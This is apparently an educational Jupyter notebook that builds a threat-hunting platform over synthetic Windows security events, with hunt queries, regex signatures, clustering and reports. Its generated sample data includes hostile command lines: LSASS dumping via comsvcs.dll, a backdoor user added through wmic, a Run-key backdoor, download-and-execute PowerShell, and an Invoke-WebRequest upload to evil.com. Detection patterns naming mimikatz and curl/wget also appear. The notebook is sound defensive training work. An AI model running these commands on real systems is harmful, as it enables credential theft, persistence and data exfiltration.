# Threat Hunting Intelligence Program

> **Authorized lab use only.** This notebook is an educational demonstration. Run it only with synthetic data or systems you own and are permitted to test.


In [ ]:
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
import json
import re
from datetime import datetime, timedelta
import hashlib
import base64
from collections import defaultdict, Counter
import random
import ipaddress
from sklearn.cluster import DBSCAN
from sklearn.preprocessing import StandardScaler
import warnings
warnings.filterwarnings('ignore')

class ThreatHuntingPlatform:
    def __init__(self):
        self.security_events = self.generate_security_events()
        self.threat_signatures = self.load_threat_signatures()
        self.attack_patterns = self.load_attack_patterns()
        self.hunt_queries = self.create_hunt_queries()

    def generate_security_events(self):
        np.random.seed(42)
        events = []

        event_types = ['process_creation', 'network_connection', 'file_access', 'registry_modification',
                      'login_event', 'powershell_execution', 'dns_query', 'service_creation']

        users = ['admin', 'user1', 'service_account', 'backup_user', 'guest', 'system']
        hosts = [f'workstation-{i:02d}' for i in range(1, 21)]
        processes = ['cmd.exe', 'powershell.exe', 'rundll32.exe', 'svchost.exe', 'explorer.exe',
                    'chrome.exe', 'notepad.exe', 'wmiprvse.exe', 'winlogon.exe', 'lsass.exe']

        for i in range(5000):
            event = {
                'event_id': f'EVT_{i+1:06d}',
                'timestamp': datetime.now() - timedelta(minutes=np.random.randint(1, 10080)),
                'event_type': np.random.choice(event_types),
                'host': np.random.choice(hosts),
                'user': np.random.choice(users),
                'process': np.random.choice(processes),
                'process_id': np.random.randint(1000, 9999),
                'parent_process': np.random.choice(processes),
                'command_line': self.generate_command_line(),
                'src_ip': f"192.168.{np.random.randint(1,10)}.{np.random.randint(1,255)}",
                'dst_ip': self.generate_dst_ip(),
                'dst_port': np.random.choice([80, 443, 53, 445, 3389, 22, 135, 139]),
                'file_path': self.generate_file_path(),
                'registry_key': self.generate_registry_key(),
                'severity': np.random.choice(['low', 'medium', 'high', 'critical'], p=[0.5, 0.3, 0.15, 0.05]),
                'anomaly_score': np.random.uniform(0, 1)
            }
            events.append(event)

        suspicious_events = self.inject_suspicious_activity(events)
        return events + suspicious_events

    def generate_command_line(self):
        normal_commands = [
            'notepad.exe document.txt',
            'chrome.exe --new-window',
            'explorer.exe C:\\Users',
            'cmd.exe /c dir',
            'svchost.exe -k netsvcs'
        ]

        suspicious_commands = [
            'powershell.exe -enc JABhAD0AJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AYwBvAG0A',
            'cmd.exe /c whoami && net user && ipconfig',
            'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication "',
            'powershell.exe IEX (New-Object Net.WebClient).DownloadString',
            'wmic process call create "cmd.exe /c net user hacker password123 /add"'
        ]

        if np.random.random() < 0.1:
            return np.random.choice(suspicious_commands)
        return np.random.choice(normal_commands)

    def generate_dst_ip(self):
        if np.random.random() < 0.8:
            return f"192.168.{np.random.randint(1,10)}.{np.random.randint(1,255)}"
        else:
            return f"{np.random.randint(1,223)}.{np.random.randint(1,255)}.{np.random.randint(1,255)}.{np.random.randint(1,255)}"

    def generate_file_path(self):
        normal_paths = [
            'C:\\Windows\\System32\\notepad.exe',
            'C:\\Program Files\\Google\\Chrome\\chrome.exe',
            'C:\\Users\\user1\\Documents\\report.docx'
        ]

        suspicious_paths = [
            'C:\\Windows\\Temp\\malicious.exe',
            'C:\\Users\\Public\\backdoor.bat',
            'C:\\ProgramData\\evil.dll',
            '%APPDATA%\\Roaming\\cryptor.exe'
        ]

        if np.random.random() < 0.15:
            return np.random.choice(suspicious_paths)
        return np.random.choice(normal_paths)

    def generate_registry_key(self):
        normal_keys = [
            'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion',
            'HKCU\\SOFTWARE\\Microsoft\\Internet Explorer',
            'HKLM\\SYSTEM\\CurrentControlSet\\Services'
        ]

        suspicious_keys = [
            'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware',
            'HKCU\\SOFTWARE\\Classes\\exefile\\shell\\open\\command',
            'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe'
        ]

        if np.random.random() < 0.2:
            return np.random.choice(suspicious_keys)
        return np.random.choice(normal_keys)

    def inject_suspicious_activity(self, events):
        suspicious_events = []

        apt_scenarios = [
            self.create_apt_lateral_movement(),
            self.create_credential_dumping_scenario(),
            self.create_data_exfiltration_scenario(),
            self.create_persistence_scenario()
        ]

        for scenario in apt_scenarios:
            suspicious_events.extend(scenario)

        return suspicious_events

    def create_apt_lateral_movement(self):
        base_time = datetime.now() - timedelta(hours=2)
        events = []

        events.append({
            'event_id': 'APT_001',
            'timestamp': base_time,
            'event_type': 'network_connection',
            'host': 'workstation-01',
            'user': 'admin',
            'process': 'wmiprvse.exe',
            'process_id': 1337,
            'parent_process': 'svchost.exe',
            'command_line': 'wmic /node:"workstation-02" process call create "cmd.exe"',
            'src_ip': '192.168.1.10',
            'dst_ip': '192.168.1.20',
            'dst_port': 135,
            'file_path': '',
            'registry_key': '',
            'severity': 'high',
            'anomaly_score': 0.85
        })

        events.append({
            'event_id': 'APT_002',
            'timestamp': base_time + timedelta(minutes=5),
            'event_type': 'process_creation',
            'host': 'workstation-02',
            'user': 'admin',
            'process': 'cmd.exe',
            'process_id': 2468,
            'parent_process': 'wmiprvse.exe',
            'command_line': 'cmd.exe /c net user /domain',
            'src_ip': '192.168.1.20',
            'dst_ip': '192.168.1.1',
            'dst_port': 445,
            'file_path': '',
            'registry_key': '',
            'severity': 'medium',
            'anomaly_score': 0.75
        })

        return events

    def create_credential_dumping_scenario(self):
        base_time = datetime.now() - timedelta(hours=1)
        events = []

        events.append({
            'event_id': 'CRED_001',
            'timestamp': base_time,
            'event_type': 'process_creation',
            'host': 'workstation-05',
            'user': 'system',
            'process': 'rundll32.exe',
            'process_id': 3691,
            'parent_process': 'powershell.exe',
            'command_line': 'rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump',
            'src_ip': '192.168.1.50',
            'dst_ip': '',
            'dst_port': 0,
            'file_path': 'C:\\temp\\lsass.dmp',
            'registry_key': '',
            'severity': 'critical',
            'anomaly_score': 0.95
        })

        return events

    def create_data_exfiltration_scenario(self):
        base_time = datetime.now() - timedelta(minutes=30)
        events = []

        events.append({
            'event_id': 'EXFIL_001',
            'timestamp': base_time,
            'event_type': 'network_connection',
            'host': 'workstation-03',
            'user': 'user1',
            'process': 'powershell.exe',
            'process_id': 4825,
            'parent_process': 'cmd.exe',
            'command_line': 'powershell.exe Invoke-WebRequest -Uri "http://evil.com/upload"',
            'src_ip': '192.168.1.30',
            'dst_ip': '203.0.113.42',
            'dst_port': 443,
            'file_path': '',
            'registry_key': '',
            'severity': 'high',
            'anomaly_score': 0.90
        })

        return events

    def create_persistence_scenario(self):
        base_time = datetime.now() - timedelta(minutes=15)
        events = []

        events.append({
            'event_id': 'PERSIST_001',
            'timestamp': base_time,
            'event_type': 'registry_modification',
            'host': 'workstation-07',
            'user': 'admin',
            'process': 'reg.exe',
            'process_id': 5947,
            'parent_process': 'cmd.exe',
            'command_line': 'reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor',
            'src_ip': '192.168.1.70',
            'dst_ip': '',
            'dst_port': 0,
            'file_path': '',
            'registry_key': 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor',
            'severity': 'high',
            'anomaly_score': 0.88
        })

        return events

    def load_threat_signatures(self):
        return {
            'powershell_encoded': {
                'pattern': r'powershell.*-enc.*[A-Za-z0-9+/]{20,}',
                'description': 'Base64 encoded PowerShell command',
                'severity': 'high',
                'mitre_tactic': 'T1059.001'
            },
            'credential_dumping': {
                'pattern': r'(mimikatz|sekurlsa|lsadump|procdump.*lsass)',
                'description': 'Credential dumping activity detected',
                'severity': 'critical',
                'mitre_tactic': 'T1003'
            },
            'lateral_movement_wmi': {
                'pattern': r'wmic.*process.*call.*create',
                'description': 'WMI lateral movement technique',
                'severity': 'high',
                'mitre_tactic': 'T1047'
            },
            'persistence_registry': {
                'pattern': r'reg.*add.*\\Run\\',
                'description': 'Registry persistence mechanism',
                'severity': 'medium',
                'mitre_tactic': 'T1547.001'
            },
            'suspicious_network': {
                'pattern': r'(curl|wget|Invoke-WebRequest).*http',
                'description': 'Suspicious network download activity',
                'severity': 'medium',
                'mitre_tactic': 'T1105'
            }
        }

    def load_attack_patterns(self):
        return {
            'apt_campaign': {
                'name': 'Advanced Persistent Threat Campaign',
                'stages': ['initial_access', 'execution', 'persistence', 'privilege_escalation', 'credential_access', 'lateral_movement', 'exfiltration'],
                'indicators': ['powershell_encoded', 'credential_dumping', 'lateral_movement_wmi', 'persistence_registry'],
                'confidence_threshold': 0.8
            },
            'ransomware_deployment': {
                'name': 'Ransomware Deployment Pattern',
                'stages': ['execution', 'defense_evasion', 'discovery', 'lateral_movement', 'impact'],
                'indicators': ['process_injection', 'file_encryption', 'network_discovery'],
                'confidence_threshold': 0.75
            },
            'insider_threat': {
                'name': 'Insider Threat Activity',
                'stages': ['credential_access', 'collection', 'exfiltration'],
                'indicators': ['unusual_file_access', 'data_staging', 'external_communication'],
                'confidence_threshold': 0.65
            }
        }

    def create_hunt_queries(self):
        return {
            'encoded_powershell': {
                'query': 'event_type == "powershell_execution" and command_line.str.contains("-enc", case=False)',
                'description': 'Hunt for base64 encoded PowerShell commands',
                'category': 'execution'
            },
            'unusual_network_connections': {
                'query': 'dst_port not in [80, 443, 53] and dst_ip.str.startswith("192.168") == False',
                'description': 'Identify connections to external IPs on unusual ports',
                'category': 'command_control'
            },
            'privilege_escalation': {
                'query': 'user == "system" and parent_process != "services.exe"',
                'description': 'Look for processes running as SYSTEM with unusual parents',
                'category': 'privilege_escalation'
            },
            'suspicious_file_locations': {
                'query': 'file_path.str.contains("\\\\Temp\\\\|\\\\Public\\\\|\\\\AppData\\\\Roaming\\\\", case=False)',
                'description': 'Monitor file activity in suspicious locations',
                'category': 'defense_evasion'
            },
            'lateral_movement_indicators': {
                'query': 'process in ["wmiprvse.exe", "psexec.exe"] and dst_port in [135, 445]',
                'description': 'Detect potential lateral movement via WMI or SMB',
                'category': 'lateral_movement'
            }
        }

    def execute_hunt_query(self, query_name):
        df = pd.DataFrame(self.security_events)

        if query_name not in self.hunt_queries:
            return {"error": "Hunt query not found"}

        hunt = self.hunt_queries[query_name]

        try:
            if query_name == 'encoded_powershell':
                results = df[df['command_line'].str.contains('-enc', case=False, na=False)]
            elif query_name == 'unusual_network_connections':
                external_ips = ~df['dst_ip'].str.startswith('192.168', na=False)
                unusual_ports = ~df['dst_port'].isin([80, 443, 53])
                results = df[external_ips & unusual_ports]
            elif query_name == 'privilege_escalation':
                system_user = df['user'] == 'system'
                unusual_parent = df['parent_process'] != 'services.exe'
                results = df[system_user & unusual_parent]
            elif query_name == 'suspicious_file_locations':
                suspicious_paths = df['file_path'].str.contains('\\\\Temp\\\\|\\\\Public\\\\|\\\\AppData\\\\', case=False, na=False)
                results = df[suspicious_paths]
            elif query_name == 'lateral_movement_indicators':
                lateral_processes = df['process'].isin(['wmiprvse.exe', 'psexec.exe'])
                lateral_ports = df['dst_port'].isin([135, 445])
                results = df[lateral_processes & lateral_ports]
            else:
                results = pd.DataFrame()

            return {
                'query_name': query_name,
                'description': hunt['description'],
                'category': hunt['category'],
                'total_results': len(results),
                'results': results.head(10).to_dict('records') if len(results) > 0 else []
            }
        except Exception as e:
            return {"error": f"Query execution failed: {str(e)}"}

    def signature_matching(self):
        matches = []

        for event in self.security_events:
            command_line = event.get('command_line', '')

            for sig_name, sig_data in self.threat_signatures.items():
                if re.search(sig_data['pattern'], command_line, re.IGNORECASE):
                    matches.append({
                        'event_id': event['event_id'],
                        'signature': sig_name,
                        'description': sig_data['description'],
                        'severity': sig_data['severity'],
                        'mitre_tactic': sig_data['mitre_tactic'],
                        'timestamp': event['timestamp'],
                        'host': event['host'],
                        'matched_content': command_line
                    })

        return matches

    def behavioral_analysis(self):
        df = pd.DataFrame(self.security_events)

        behavioral_anomalies = []

        user_activity = df.groupby(['user', 'host']).size().reset_index(name='event_count')
        high_activity_threshold = user_activity['event_count'].quantile(0.95)
        high_activity_users = user_activity[user_activity['event_count'] > high_activity_threshold]

        for _, row in high_activity_users.iterrows():
            behavioral_anomalies.append({
                'type': 'high_activity_volume',
                'user': row['user'],
                'host': row['host'],
                'event_count': row['event_count'],
                'severity': 'medium',
                'description': f"User {row['user']} generated {row['event_count']} events"
            })

        process_chains = df.groupby(['host', 'parent_process', 'process']).size().reset_index(name='chain_count')
        unusual_chains = process_chains[
            (process_chains['parent_process'] == 'powershell.exe') &
            (process_chains['process'] == 'cmd.exe')
        ]

        for _, row in unusual_chains.iterrows():
            behavioral_anomalies.append({
                'type': 'unusual_process_chain',
                'host': row['host'],
                'parent_process': row['parent_process'],
                'child_process': row['process'],
                'severity': 'high',
                'description': f"Unusual process chain: {row['parent_process']} -> {row['process']}"
            })

        return behavioral_anomalies

    def threat_clustering(self):
        df = pd.DataFrame(self.security_events)

        features_df = df[['anomaly_score', 'dst_port']].copy()
        features_df['hour'] = pd.to_datetime(df['timestamp']).dt.hour
        features_df['severity_numeric'] = df['severity'].map({'low': 1, 'medium': 2, 'high': 3, 'critical': 4})

        features_df = features_df.fillna(0)

        scaler = StandardScaler()
        features_scaled = scaler.fit_transform(features_df)

        clustering = DBSCAN(eps=0.5, min_samples=5)
        clusters = clustering.fit_predict(features_scaled)

        df['cluster'] = clusters

        cluster_analysis = []
        for cluster_id in np.unique(clusters):
            if cluster_id == -1:
                continue

            cluster_events = df[df['cluster'] == cluster_id]

            cluster_analysis.append({
                'cluster_id': cluster_id,
                'event_count': len(cluster_events),
                'avg_anomaly_score': cluster_events['anomaly_score'].mean(),
                'common_hosts': cluster_events['host'].mode().values.tolist(),
                'common_processes': cluster_events['process'].mode().values.tolist(),
                'severity_distribution': cluster_events['severity'].value_counts().to_dict()
            })

        return cluster_analysis

    def timeline_analysis(self):
        df = pd.DataFrame(self.security_events)
        df['timestamp'] = pd.to_datetime(df['timestamp'])

        fig, axes = plt.subplots(3, 1, figsize=(15, 12))

        hourly_events = df.groupby(df['timestamp'].dt.hour).size()
        axes[0].plot(hourly_events.index, hourly_events.values, marker='o')
        axes[0].set_title('Security Events by Hour of Day')
        axes[0].set_xlabel('Hour')
        axes[0].set_ylabel('Event Count')
        axes[0].grid(True, alpha=0.3)

        severity_timeline = df.groupby([df['timestamp'].dt.date, 'severity']).size().unstack(fill_value=0)
        severity_timeline.plot(kind='area', stacked=True, ax=axes[1],
                              color=['green', 'yellow', 'orange', 'red'])
        axes[1].set_title('Security Events by Severity Over Time')
        axes[1].set_xlabel('Date')
        axes[1].set_ylabel('Event Count')
        axes[1].legend(title='Severity')

        top_hosts = df['host'].value_counts().head(10)
        axes[2].barh(top_hosts.index, top_hosts.values)
        axes[2].set_title('Top 10 Most Active Hosts')
        axes[2].set_xlabel('Event Count')

        plt.tight_layout()
        plt.show()

        return {
            'hourly_distribution': hourly_events.to_dict(),
            'top_active_hosts': top_hosts.to_dict()
        }

    def generate_threat_report(self):
        signature_matches = self.signature_matching()
        behavioral_anomalies = self.behavioral_analysis()
        clusters = self.threat_clustering()

        report = {
            'report_generated': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'total_events_analyzed': len(self.security_events),
            'signature_matches': len(signature_matches),
            'behavioral_anomalies': len(behavioral_anomalies),
            'threat_clusters': len(clusters),
            'high_severity_events': len([e for e in self.security_events if e['severity'] in ['high', 'critical']]),
            'top_threats': signature_matches[:10],
            'anomalies': behavioral_anomalies[:5],
            'cluster_summary': clusters[:3]
        }

        print("🎯 THREAT HUNTING REPORT")
        print("=" * 50)
        print(f"Report Generated: {report['report_generated']}")
        print(f"Total Events Analyzed: {report['total_events_analyzed']:,}")
        print(f"Signature Matches: {report['signature_matches']}")
        print(f"Behavioral Anomalies: {report['behavioral_anomalies']}")
        print(f"Threat Clusters: {report['threat_clusters']}")
        print(f"High/Critical Severity: {report['high_severity_events']}")

        if signature_matches:
            print(f"\nTop Signature Matches:")
            for match in signature_matches[:5]:
                print(f"  • {match['signature']}: {match['description']} ({match['severity']})")

        if behavioral_anomalies:
            print(f"\nBehavioral Anomalies:")
            for anomaly in behavioral_anomalies[:3]:
                print(f"  • {anomaly['type']}: {anomaly['description']}")

        return report

    def run_hunt_campaign(self):
        print("🕵️ THREAT HUNTING INTELLIGENCE PLATFORM")
        print("=" * 50)

        print("\n1. EXECUTING HUNT QUERIES:")
        hunt_results = {}
        for query_name in self.hunt_queries.keys():
            result = self.execute_hunt_query(query_name)
            hunt_results[query_name] = result
            print(f"  {query_name}: {result.get('total_results', 0)} matches")

        print("\n2. SIGNATURE MATCHING:")
        matches = self.signature_matching()
        print(f"  Found {len(matches)} signature matches")

        print("\n3. BEHAVIORAL ANALYSIS:")
        anomalies = self.behavioral_analysis()
        print(f"  Detected {len(anomalies)} behavioral anomalies")

        print("\n4. THREAT CLUSTERING:")
        clusters = self.threat_clustering()
        print(f"  Identified {len(clusters)} threat clusters")

        print("\n5. TIMELINE ANALYSIS:")
        timeline_data = self.timeline_analysis()

        print("\n6. COMPREHENSIVE THREAT REPORT:")
        threat_report = self.generate_threat_report()

        return {
            'hunt_results': hunt_results,
            'signature_matches': matches,
            'behavioral_anomalies': anomalies,
            'threat_clusters': clusters,
            'timeline_analysis': timeline_data,
            'threat_report': threat_report
        }

platform = ThreatHuntingPlatform()
campaign_results = platform.run_hunt_campaign()

print(f"\n🔍 INTERACTIVE HUNTING:")
print("Available hunt queries:")
for query_name, query_data in platform.hunt_queries.items():
    print(f"• platform.execute_hunt_query('{query_name}')")
print("• platform.signature_matching()")
print("• platform.behavioral_analysis()")
print("• platform.threat_clustering()")